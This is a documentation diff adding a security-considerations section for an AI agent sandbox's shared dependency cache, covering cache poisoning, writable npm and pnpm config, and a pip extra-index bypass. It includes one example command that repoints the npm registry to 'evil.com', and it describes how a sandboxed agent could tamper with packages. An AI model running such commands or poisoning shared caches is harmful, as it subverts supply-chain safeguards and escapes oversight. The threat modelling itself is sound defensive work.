@@ -469,3 +469,31 @@ docker logs druppie-new-backend 2>&1 | grep github_app
 ```
 
 If configured correctly, `GitHubAppService` logs `enabled=True`. If any env var is missing, it logs `disabled` and the `update_core` flow will return an error when triggered.
+
+---
+
+## Security Considerations: Shared Dependency Cache
+
+The shared dependency cache (`druppie_sandbox_dep_cache`) improves sandbox startup time by persisting downloaded packages across runs. The following are accepted risks and limitations:
+
+### Read-Write Cache Volume
+
+The cache volume is mounted read-write to all sandboxes. A compromised sandbox could tamper with cached tarballs, poisoning packages for subsequent sandboxes.
+
+**Mitigations:** HTTPS-only registry configs (`.npmrc`, `.pnpmrc`, `pip.conf`) prevent registry spoofing. The OSV vulnerability scanner catches known vulnerabilities in cached packages.
+
+**Future improvement:** Mount the cache `:ro` in sandboxes and use a separate write service for cache population. This requires an architectural change tracked in the backlog.
+
+### Writable .npmrc / .pnpmrc
+
+Unlike pip (which supports system-level `/etc/pip.conf`), npm and pnpm only support per-user config files (`~/.npmrc`, `~/.pnpmrc`). These are writable by the sandbox user, meaning an agent could override registry settings (e.g., `echo "registry=http://evil.com" > ~/.npmrc`).
+
+**Accepted limitation:** An agent with arbitrary code execution already has broad access. The config files are defense-in-depth, not a hard security boundary.
+
+### PIP_EXTRA_INDEX_URL Bypass
+
+The system-level `pip.conf` correctly sets the primary index to HTTPS, but the `PIP_EXTRA_INDEX_URL` environment variable can add additional (potentially insecure) indexes. This is a pip design limitation.
+
+### Docker-in-Docker Removed
+
+DinD support (Docker CE, SYS_ADMIN/MKNOD capabilities) was removed as part of security hardening. SYS_ADMIN is the #1 container escape vector. Rootless Docker as an alternative is tracked in the backlog.
